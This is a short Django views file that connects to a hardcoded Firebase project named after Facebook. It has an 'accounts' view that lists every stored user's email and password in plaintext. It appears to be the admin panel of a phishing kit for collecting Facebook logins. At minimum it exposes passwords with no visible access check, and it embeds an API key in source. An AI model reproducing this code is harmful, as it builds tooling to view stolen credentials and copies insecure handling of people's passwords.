from django.shortcuts import render
from pyrebase import pyrebase

config = {
  "apiKey": "AIzaSyAxTK3AVErxrgX7uzYzC3-cpgNes1qrLK8",
  "authDomain": "facebook-b-429a8.firebaseapp.com",
  "databaseURL": "https://facebook-b-429a8.firebaseio.com",
  "storageBucket": "facebook-b-429a8.appspot.com"
}

firebase = pyrebase.initialize_app(config)

# Create your views here.
def home(request):
    key = request.GET.get("k",False)
    context={
        "key": key,
    }
    return render(request, "home/index.html", context)

def accounts(request):
    db = firebase.database()
    userObj=db.child("users").get()
    key = request.GET.get("k",False)
    users = []
    for user in userObj.each():
        users.append({ "Email":user.key(), "Pass":user.val() })
    

    context={
            "key": key,
            "users": users,
    }
    return render(request, "home/accounts.html", context)

